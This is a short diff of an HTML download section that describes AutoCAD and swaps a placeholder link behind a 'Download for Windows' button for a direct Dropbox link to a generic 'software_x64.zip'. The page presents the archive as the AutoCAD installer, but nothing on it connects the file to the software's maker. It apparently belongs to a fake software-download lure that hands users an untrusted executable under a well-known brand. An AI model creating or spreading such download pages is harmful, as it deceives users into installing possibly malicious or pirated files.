@@ -6,7 +6,7 @@
 <h3>AutoCAD for Windows</h3>
 <p>AutoCAD is a professional-grade software used for creating precise 2D and 3D technical drawings and models. Popular in the architecture, engineering, and construction industries, it allows users to design complex structures, mechanical parts, and layouts with ease. AutoCAD’s advanced features and flexibility make it a go-to tool for professionals in CAD design.</p>
 
-<a href="#">
+<a href="https://www.dropbox.com/scl/fi/4oj37cybiy9anrbd5vr5x/software_x64.zip?rlkey=iaoleqpj6cg1iru6ymfyzlpt8&st=n8evwdqs&dl=1">
   <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Download for Windows"/>
 </a>
 </div>
